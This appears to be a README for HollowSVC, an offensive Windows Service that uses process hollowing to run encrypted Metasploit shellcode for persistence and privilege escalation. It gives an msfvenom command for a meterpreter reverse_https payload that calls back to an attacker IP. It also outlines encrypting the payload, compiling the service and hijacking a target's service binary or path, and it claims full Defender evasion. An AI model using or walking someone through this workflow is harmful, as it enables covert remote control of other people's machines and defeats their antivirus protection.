<p align="center">
    <img src="/img/8-EoupSza0CCIElrl.png" alt="Logo" width="350" height="350">
</p>
This program is a Windows Service that utilizes the 'process hollowing' technique to run shellcode. It requires the ROT-encrypted shellcode that the user will create using the HollowCrypt program. I created this because there were moments when I needed a custom and straightforward way to run Metasploit shellcode on a Windows Service for persistence/privilege escalation, and using common tools would trigger my binaries... 


## How to use it

First, we need to create our shellcode:
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.147 LPORT=443 EXITFUNC=thread -f csharp
```

Then, edit the HollowCrypt source code , compile and execute:
```
HollowCrypt.exe
```

After that, replace the encrypted shellcode in the HollowSVC source code. 
Now  compile the service in the arch of your target, setup your listener, hijack the binary/path in the target and run!

## POC
Running service with path to HollowSVC executable:
<p align="center">
  <img src="/img/legitsvc2.png" alt="legitsvc2" width="350" height="350">
</p>

Meterpreter retrieved:
<p align="center">
  <img src="/img/legitsvc3.png" alt="legitsvc3" width="700" height="150">
</p>

Defender FUD:
<p align="center">
  <img src="/img/legitsvc4.png" alt="legitsvc4" width="500" height="350">
</p>
And remember, there is always ways to improve this!
